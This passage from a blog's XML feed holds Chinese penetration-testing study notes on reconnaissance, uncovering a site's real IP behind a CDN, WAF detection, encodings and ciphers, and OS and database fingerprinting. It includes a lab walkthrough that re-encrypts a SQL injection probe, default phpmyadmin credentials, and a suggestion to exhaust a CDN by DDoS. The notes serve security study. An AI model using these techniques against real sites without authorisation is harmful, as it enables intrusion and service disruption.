        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>08信息收集--架构，搭建，WAF</title>
      <link href="/2021/09/21/08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF/"/>
      <url>/2021/09/21/08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在安全测试中，信息收集是非常重要的一个环节，此环节的信息将影响到后续的成功几率，掌握信息的多少将决定发现漏洞机会大小，换言之决定着是否能完成目标的测试任务。也可以很直接的跟大家说：渗透测试的思路就是从信息收集这里开始，你与大牛的差距也是从这里开始的！</p><h3 id="站点搭建分析"><a href="#站点搭建分析" class="headerlink" title="站点搭建分析"></a>站点搭建分析</h3><h4 id="目录类站点"><a href="#目录类站点" class="headerlink" title="目录类站点"></a>目录类站点</h4><p>一个网站路径里还有一个网站，相当于网站套网站。只要俩个网站一个里有漏洞，就都被攻克。</p><p>两者仅仅是目录路径不同</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057037.png" alt="image-20210921105707970"></p><h4 id="端口类站点"><a href="#端口类站点" class="headerlink" title="端口类站点"></a>端口类站点</h4><p>一台服务器上，不同端口有好几个网站，一台网站出现问题，其他网站也会被攻击</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211056397.png" alt="image-20210819164038159"></p><p>​    <img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211056416.png" alt="image-20210819164053929"></p><h4 id="子域名站点"><a href="#子域名站点" class="headerlink" title="子域名站点"></a>子域名站点</h4><p>俩个网站有可能不在一个服务器上</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211056410.png" alt="image-20210819164312373"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057243.png" alt="image-20210921105717173"></p><p>bbs.goodlift.net采用Discuz，俩个网站俩套CMS</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211056425.png" alt="image-20210819164719941"></p><p>两个站点可能不在同一个服务器</p><h4 id="类似域名站点"><a href="#类似域名站点" class="headerlink" title="类似域名站点"></a>类似域名站点</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057014.png" alt="image-20210921105724964"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057966.png" alt="image-20210921105731867"></p><p>多个域名，同一个网站</p><h4 id="旁注，C段站点"><a href="#旁注，C段站点" class="headerlink" title="旁注，C段站点"></a>旁注，C段站点</h4><p>旁站概念</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">旁站是和目标网站在同一台服务器上的其它的网站；如果从目标站本身找不到好的入手点，这时候，如果想快速拿下目标的话，一般都会先找个目标站点所在服务器上其他的比较好搞的站下手，然后再想办法跨到真正目标的站点目录中。</span><br></pre></td></tr></table></figure><p>C段概念</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C段是和目标机器ip处在同一个C段的其它机器；通过目标所在C段的其他任一台机器，想办法跨到我们的目标机器上。常用的工具有webscancc，Nmap，Zenmap。</span><br></pre></td></tr></table></figure><p>在线查询工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">旁站和C段在线查询地址：</span><br><span class="line">http://www.webscan.cc/</span><br><span class="line">http://stool.chinaz.com/same</span><br></pre></td></tr></table></figure><p>常用工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web：k8旁站、御剑1.5</span><br><span class="line">K8Cscan大型内网渗透自定义插件化扫描神器，包含信息收集、网络资产、漏洞扫描、密码爆破、漏洞利用，程序采用多线程批量扫描大型内网多个IP段C段主机，目前插件包含: C段旁注扫描、子域名扫描、Ftp密码爆破、Mysql密码爆破、Oracle密码爆破、MSSQL密码爆破、Windows/Linux系统密码爆破、存活主机扫描、端口扫描、Web信息探测、操作系统版本探测、Cisco思科设备扫描等,支持调用任意外部程序或脚本，支持Cobalt Strike联动</span><br><span class="line">下载地址：https://github.com/k8gege/K8CScan</span><br><span class="line">最新版Ladon https://github.com/k8gege/Ladon</span><br></pre></td></tr></table></figure><h4 id="搭建软件特征站点"><a href="#搭建软件特征站点" class="headerlink" title="搭建软件特征站点"></a>搭建软件特征站点</h4><p>一体化搭建软件：宝塔、PHPstudy、WMAP、INMAP（Nginx</p><p>常规的搭建软件都有常规的数据库的默认账号密码，如果搭建者不去更改的话，就能成为突破思路。</p><p>例：</p><p>Apache/2.4.41(win32)OpenSSL/1.1.1c mod_fcgid/2.3.9a  宝塔 (信息很全基本上是搭建软件)</p><p>Apache/2.4.41(win32)OpenSSL/1.0.2j PHP/5.4.45  默认的安全设置(/phpmyadmin root/root)</p><h3 id="WAF防护分析"><a href="#WAF防护分析" class="headerlink" title="WAF防护分析"></a>WAF防护分析</h3><h4 id="什么是WAF应用"><a href="#什么是WAF应用" class="headerlink" title="什么是WAF应用"></a>什么是WAF应用</h4><p>Web应用防护系统(Web Application Firewall, 简称:WAF)代表了一类新兴的信息安全技术，用以解决诸如防火墙一类传统设备束手无策的Web应用安全问题。</p><p>分为：硬件形式和软件形式。</p><p>在安全公司单位购买的防火墙都是硬件，个人网站和小企业搭建都是软件。</p><h4 id="如何快速识别WAF"><a href="#如何快速识别WAF" class="headerlink" title="如何快速识别WAF"></a>如何快速识别WAF</h4><p>通过wafw00f来识别</p><p>下载地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EnableSecurity/wafw00f</span><br></pre></td></tr></table></figure><p>使用文档</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/enablesecurity/wafw00f/wiki</span><br></pre></td></tr></table></figure><p>安装环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3环境 ---&gt;使用 pip install wafw00f 进行安装</span><br></pre></td></tr></table></figure><p>Windows下安装使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/qingchengzi/articles/13451885.html</span><br></pre></td></tr></table></figure><h4 id="判定waf的一个标准"><a href="#判定waf的一个标准" class="headerlink" title="判定waf的一个标准"></a>判定waf的一个标准</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211056955.png" alt="image-20210819170721484"></p><h3 id="涉及资源"><a href="#涉及资源" class="headerlink" title="涉及资源"></a>涉及资源</h3><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>07信息收集--CDN绕过技术</title>
      <link href="/2021/09/21/07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/"/>
      <url>/2021/09/21/07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>CDN 的全称是 Content Delivery Network，即内容分发网络。CDN 是构建在现有网络基础之上的智能虚拟网络，依靠部署在各地的边缘服务器，通过中心平台的负载均衡、内容分发、调度等功能模块，使用户就近获取所需内容，降低网络拥塞，提高用户访问响应速度和命中率。但在安全测试过程中，若目标存在 CDN 服务，将会影响到后续的安全测试过程。</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211049339.png" alt="image-20210921104908229" style="zoom:80%;" /><p>相当于一个节点，把网站上的一些缓存放到cdn中，你访问到的ip不是原网站而是cdn。所有如果需要进行渗透测试需要绕过cdn，找到真实网站的ip。</p><h3 id="如何判断目标存在-CDN-服务？"><a href="#如何判断目标存在-CDN-服务？" class="headerlink" title="如何判断目标存在 CDN 服务？"></a>如何判断目标存在 CDN 服务？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ping.chinaz.com</span><br></pre></td></tr></table></figure><p>利用多节点技术进行请求返回判断</p><ul><li><p>有CDN情况：</p></li><li><p>有多个IP返回，说明存在CDN</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210921104916943.png" alt="image-20210921104916943"></p></li><li><p>无CDN情况:</p><p>只有1个IP返回</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048734.png" alt="image-20210819143741293"></p></li></ul><h3 id="CDN绕过技术"><a href="#CDN绕过技术" class="headerlink" title="CDN绕过技术"></a>CDN绕过技术</h3><h4 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h4><p>如果我们查到他的子域名的ip不变，我们可以通过ping探测同一网段的ip，看主网站是否和他在一个网站。</p><h4 id="邮件服务查询"><a href="#邮件服务查询" class="headerlink" title="邮件服务查询"></a>邮件服务查询</h4><p>根据对方邮件服务器的地址来获取对方网站真正的ip</p><h4 id="国外地址请求"><a href="#国外地址请求" class="headerlink" title="国外地址请求"></a>国外地址请求</h4><p>可以通过伪造国外ip地址访问网站，来获取真实网站ip，vpn来伪造</p><h4 id="遗留文件，扫描全网"><a href="#遗留文件，扫描全网" class="headerlink" title="遗留文件，扫描全网"></a>遗留文件，扫描全网</h4><p>谷歌搜索查看该网站的遗留文件，来获取ip eg:phpinfo</p><h4 id="黑暗引擎搜索特定文件"><a href="#黑暗引擎搜索特定文件" class="headerlink" title="黑暗引擎搜索特定文件"></a>黑暗引擎搜索特定文件</h4><p>shodan、fofa、 zoomeye</p><h4 id="DNS历史记录，以量打量（DDOS）"><a href="#DNS历史记录，以量打量（DDOS）" class="headerlink" title="DNS历史记录，以量打量（DDOS）"></a>DNS历史记录，以量打量（DDOS）</h4><p> DNS记录有之前没做CDN时候的IP记录；DDOS将CDN流量打完，访问的就是真实IP</p><h3 id="CDN-真实-IP-地址获取后绑定指向地址"><a href="#CDN-真实-IP-地址获取后绑定指向地址" class="headerlink" title="CDN 真实 IP 地址获取后绑定指向地址"></a>CDN 真实 IP 地址获取后绑定指向地址</h3><p>更改本地 HOSTS 解析指向文件</p><h3 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h3><h4 id="利用子域名请求获取IP地址"><a href="#利用子域名请求获取IP地址" class="headerlink" title="利用子域名请求获取IP地址"></a>利用子域名请求获取IP地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xueersi 子域名上的小技巧</span><br><span class="line">www.xueersi.com</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211050133.png" alt="image-20210921105002067"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xueersi.com</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048727.png" alt="image-20210819145226004"></p><p>原因：只设置了<a href="http://www.xueersi.com的cdn解析,没设置xueersi.com的cdn解析/">www.xueersi.com的cdn解析，没设置xueersi.com的cdn解析</a></p><h4 id="利用第三方接口查询获取真实IP"><a href="#利用第三方接口查询获取真实IP" class="headerlink" title="利用第三方接口查询获取真实IP"></a>利用第三方接口查询获取真实IP</h4><p>sp910 DNS历史记录=第三方接口（接口查询）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://x.threatbook.cn/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048736.png" alt="image-20210819145757460"></p><h4 id="利用国外地址请求获取真实IP"><a href="#利用国外地址请求获取真实IP" class="headerlink" title="利用国外地址请求获取真实IP"></a>利用国外地址请求获取真实IP</h4><p>m.sp910 子域名小技巧/采集/国外请求（同类型访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m.sp910</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211051854.png" alt="image-20210921105150785"></p><h4 id="利用邮件服务器接口获取真实IP"><a href="#利用邮件服务器接口获取真实IP" class="headerlink" title="利用邮件服务器接口获取真实IP"></a>利用邮件服务器接口获取真实IP</h4><p>mozhe 邮箱源码测试对比第三方查询（地区分析）</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048255.png" alt="image-20210819151810127"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211052617.png" alt="image-20210921105201554"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211052227.png" alt="image-20210921105213138"></p><p>根据ip查地址信息判断哪个是真实ip</p><p>或者修改绑定host文件为真实ip，看能否访问</p><h4 id="利用黑暗引擎搜索特定文件获取真实IP"><a href="#利用黑暗引擎搜索特定文件获取真实IP" class="headerlink" title="利用黑暗引擎搜索特定文件获取真实IP"></a>利用黑暗引擎搜索特定文件获取真实IP</h4><p>103.75.182.15:2087黑暗引擎（shodan搜指定hash文件）</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048400.png" alt="image-20210819154706132"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048422.png" alt="image-20210819161013304"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> mmh3</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">response=requests.get(<span class="string">&#x27;favicon.ico&#x27;</span>)</span><br><span class="line">favicon=response.content.encode(<span class="string">&#x27;base64&#x27;</span>)</span><br><span class="line"><span class="built_in">hash</span>=mmh3.<span class="built_in">hash</span>(favicon)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;http.favicon.hash:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">hash</span>)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048784.png" alt="image-20210819161027327"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048876.png" alt="image-20210819161040393"></p><h3 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">https://www.shodan.io</span><br><span class="line">https://x.threatbook.cn</span><br><span class="line">http://ping.chinaz.com</span><br><span class="line">https://www.get-site-ip.com/</span><br><span class="line">https://asm.ca.com/en/ping.php</span><br><span class="line">https://github.com/Tai7sy/fuckcdn</span><br><span class="line">https://github.com/boy-hack/w8fuckcdn</span><br><span class="line">https://mp.weixin.qq.com/s?__biz=MzA5MzQ3MDE1NQ==&amp;mid=2653939118&amp;id</span><br><span class="line">x=1&amp;sn=945b81344d9c89431a8c413ff633fc3a&amp;chksm=8b86290abcf1a01cdc0071</span><br><span class="line">1339884602b5bb474111d3aff2d465182702715087e22c852c158f&amp;token=2684171</span><br><span class="line">43&amp;lang=zh_CN#rd</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>06基础入门--加密编码算法</title>
      <link href="/2021/09/21/06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/"/>
      <url>/2021/09/21/06%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%8A%A0%E5%AF%86%E7%BC%96%E7%A0%81%E7%AE%97%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>在渗透测试中，常见的密码等敏感信息会采用加密处理，其中作为安全测试人员必须要了解常见的加密方式，才能为后续的安全测试做好准备，本次课程将讲解各种加密编码等知识，便于后期的学习和发展。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211046610.png" alt="image-20210921104602551"></p><h3 id="常见加密编码等算法解析"><a href="#常见加密编码等算法解析" class="headerlink" title="常见加密编码等算法解析"></a>常见加密编码等算法解析</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MD5，SHA，ASC，进制，时间戳，URL，BASE64，Unescape，AES，DES 等</span><br></pre></td></tr></table></figure><h4 id="MD5-不可逆"><a href="#MD5-不可逆" class="headerlink" title="MD5(不可逆)"></a>MD5(不可逆)</h4><p>分为16位和32位，很多网站管理员的密码都会采用md5加密。</p><p>特点：32位数字字母（a-f）混合，不可逆</p><p>解密平台：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://cmd5.com/</span><br><span class="line">somd5.com/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211046973.png" alt="image-20210921104609914"></p><h4 id="SHA"><a href="#SHA" class="headerlink" title="SHA"></a>SHA</h4><p>特点：40位数字字母（a-f）混合，不可逆</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211046306.png" alt="image-20210921104616246"></p><h4 id="SHA256-384-512"><a href="#SHA256-384-512" class="headerlink" title="SHA256/384/512"></a>SHA256/384/512</h4><p>特点：固定位数数字字母（a-f）混合，不可逆</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211046695.png" alt="image-20210921104626610" style="zoom:80%;" /><h4 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h4><p>进制编码</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211046508.png" alt="image-20210921104637429" style="zoom:67%;" /><h4 id="时间戳"><a href="#时间戳" class="headerlink" title="时间戳"></a>时间戳</h4><p>网站或者服务器脚本语言里经常会使用，会在数据库里用户登录和注销，注册里会使用</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045588.png" alt="image-20210818151856485"></p><h4 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h4><p>浏览器也会进行加密</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211046483.png" alt="image-20210921104649410"></p><h4 id="BASE64"><a href="#BASE64" class="headerlink" title="BASE64"></a>BASE64</h4><p>规律：明文越长，密文越长</p><p>特点：区分大小写，大写字母小写字母数字的组合。末尾有一个或两个==</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211047241.png" alt="image-20210921104700148"></p><h4 id="unescape"><a href="#unescape" class="headerlink" title="unescape"></a>unescape</h4><p>特点：%u+4位数字，对应两位字符，单数的时候最后一个%00，双数的时候最后一个%0000</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045604.png" alt="image-20210818155452475"></p><h4 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h4><p>是一种安全的加密方式，涉及到密码，偏移量，数据块，填充，在加密时候涉及到4种随机性。解密难度大。用base64解密出来是乱码，有很大可能是AES加密。有时候/出现在字符串里面。比较注重安全和大型网站、安全比赛<br>注：必须有密码和偏移量，否则无法进行解密</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211047004.png" alt="image-20210921104710930"></p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211047469.png" alt="image-20210921104725407" style="zoom:67%;" /><h4 id="DES"><a href="#DES" class="headerlink" title="DES"></a>DES</h4><p>特点：</p><p>明文越长，密文也越长，可自定义密码，输出有时候带’+’</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211047887.png" alt="image-20210921104733815"></p><h3 id="常见加密形式算法解析"><a href="#常见加密形式算法解析" class="headerlink" title="常见加密形式算法解析"></a>常见加密形式算法解析</h3><p>直接加密，带 salt，带密码，带偏移，带位数，带模式，带干扰，自定义组合等</p><h3 id="常见解密方式（针对）"><a href="#常见解密方式（针对）" class="headerlink" title="常见解密方式（针对）"></a>常见解密方式（针对）</h3><p>枚举，自定义逆向算法，可逆向</p><h3 id="了解常规加密算法的特性"><a href="#了解常规加密算法的特性" class="headerlink" title="了解常规加密算法的特性"></a>了解常规加密算法的特性</h3><p>长度位数，字符规律，代码分析，搜索获取等</p><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.jsons.cn/desencrypt/</span><br><span class="line">https://www.cmd5.com/</span><br><span class="line">https://tool.lu/timestamp/</span><br><span class="line">http://tool.chacuo.net/cryptaes</span><br><span class="line">http://tools.jb51.net/password/des_encode</span><br><span class="line">http://encode.chahuo.com/</span><br></pre></td></tr></table></figure><h3 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h3><h4 id="SQL注入漏洞测试-参数加密"><a href="#SQL注入漏洞测试-参数加密" class="headerlink" title="SQL注入漏洞测试(参数加密)"></a>SQL注入漏洞测试(参数加密)</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211047499.png" alt="image-20210921104742440"></p><p>可以看到id后面的参数是经过加密的。</p><p>御剑扫一下后台</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211047043.png" alt="image-20210921104749964"></p><p>发现有俩个文件</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045320.png" alt="image-20210818162005675"></p><p>php文件是一个解密的脚本，看来这个就是解密脚本。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045340.png" alt="image-20210818162553590"></p><p>因为有俩次base64加密，所有需要先解密一次</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048516.png" alt="image-20210921104801432"></p><p>再次解密，通过上面解密脚本就可以看出是AES加密，所以直接到AES中进行解密。<br>AES加密模式：CBC、数据块：128位、密码：ydhaqPQnexoaDuW3、偏移量：2018201920202021<br>解密得出：1_mozhe</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211045759.png" alt="image-20210818163746242"></p><p>之后可以看到将_mozhe删除就是1，所有参数就是1</p><p>之后我们通过这样的加密模式就可以写入我们的参数了。</p><p>这里我以1’ and 1=1 –+为例</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048950.png" alt="image-20210921104811874"></p><p>再次进行base64加密</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048272.png" alt="image-20210921104819197"></p><p>最后结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MHk4MWZ6TjArWlVSQ1hHVkUrZVdPdz09</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>05基础入门--系统及数据库</title>
      <link href="/2021/09/21/05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2021/09/21/05%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E7%B3%BB%E7%BB%9F%E5%8F%8A%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>除去前期的搭建平台中间件，网站源码等，容易受到攻击的还有操作系统数据库，第三方软件平台等。其中此类攻击也能直接影响到WEB或服务器的安全，导致网站或服务器权限的获取。</p><p>除去常规WEB层面以及APP安全外，类似服务器单一或者复杂的其他服务，游戏，负载均衡，也可以作为安全测试目标，此类目标测试原则只是为了WEB应用或者其他安全问题。</p><h3 id="操作系统层面"><a href="#操作系统层面" class="headerlink" title="操作系统层面"></a>操作系统层面</h3><h4 id="识别操作系统常见方法"><a href="#识别操作系统常见方法" class="headerlink" title="识别操作系统常见方法"></a>识别操作系统常见方法</h4><p>windows对大小写不敏感，无论大小写都是一样的，而linux对大小写敏感。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044056.png" alt="image-20210921104432990"></p><p>这个网站是windows的</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044922.png" alt="image-20210921104444650"></p><p>这个网站就是linux的</p><p>利用TTL来进行网站操作系统识别，这个不太准确</p><p>不同的操作系统的默认TTL值是不同的， 所以我们可以通过TTL值来判断主机的操作系统，但是当用户修改了TTL值的时候，就会误导我们的判断，所以这种判断方式也不一定准确。下面是默认操作系统的TTL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、WINDOWS NT/2000  TTL：128</span><br><span class="line">2、WINDOWS 95/98   TTL：32</span><br><span class="line">3、UNIX        TTL：255</span><br><span class="line">4、LINUX       TTL：64</span><br><span class="line">5、WIN7      TTL：64</span><br></pre></td></tr></table></figure><p>利用nmap进行识别</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -O ip地址</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211044467.png" alt="image-20210921104453346"></p><h4 id="简述两者区别以及识别的意义"><a href="#简述两者区别以及识别的意义" class="headerlink" title="简述两者区别以及识别的意义"></a>简述两者区别以及识别的意义</h4><p>1.网站路径区别</p><p>2.大小写区别</p><p>3.文件在linux和windows的适用性</p><p>通过判断操作系统，从合适他的漏洞进行利用</p><h4 id="操作系统层面漏洞类型对应意义"><a href="#操作系统层面漏洞类型对应意义" class="headerlink" title="操作系统层面漏洞类型对应意义"></a>操作系统层面漏洞类型对应意义</h4><p>永痕之蓝</p><p>可能会造成计算机崩溃，获取到对应shell。</p><h4 id="简要操作系统层面漏洞影响范围"><a href="#简要操作系统层面漏洞影响范围" class="headerlink" title="简要操作系统层面漏洞影响范围"></a>简要操作系统层面漏洞影响范围</h4><p>获取相应权限，某些服务崩溃，计算机崩溃</p><h3 id="数据库层面"><a href="#数据库层面" class="headerlink" title="数据库层面"></a>数据库层面</h3><p>静态网站是没有漏洞的，动态网站才有漏洞</p><h4 id="识别数据库类型常见方法"><a href="#识别数据库类型常见方法" class="headerlink" title="识别数据库类型常见方法"></a>识别数据库类型常见方法</h4><ul><li>小型数据库 Access</li><li>中型数据库 MySQL</li><li>大型数据库 Oracle、SQL Server</li></ul><p>1.通过网站识别数据库</p><p>常见搭建组合</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ASP+Access，sql server （windows）</span><br><span class="line">PHP+Mysql（linux、windows） 端口：3306</span><br><span class="line">ASPX+Mssql(windows) 端口：1433</span><br><span class="line">Jsp+Mssql（windows）,oracle （linux、windows）端口：1521</span><br><span class="line">Python+Mongodb （linux、windows）</span><br></pre></td></tr></table></figure><p> 2.利用端口扫描识别数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Oracle 1521</span><br><span class="line">MySql 3306</span><br><span class="line">SQLServer 1433</span><br><span class="line">MongoDB 27017</span><br><span class="line">Redis 6379</span><br><span class="line">memcached 11211</span><br><span class="line">psotgreSQL 5432</span><br><span 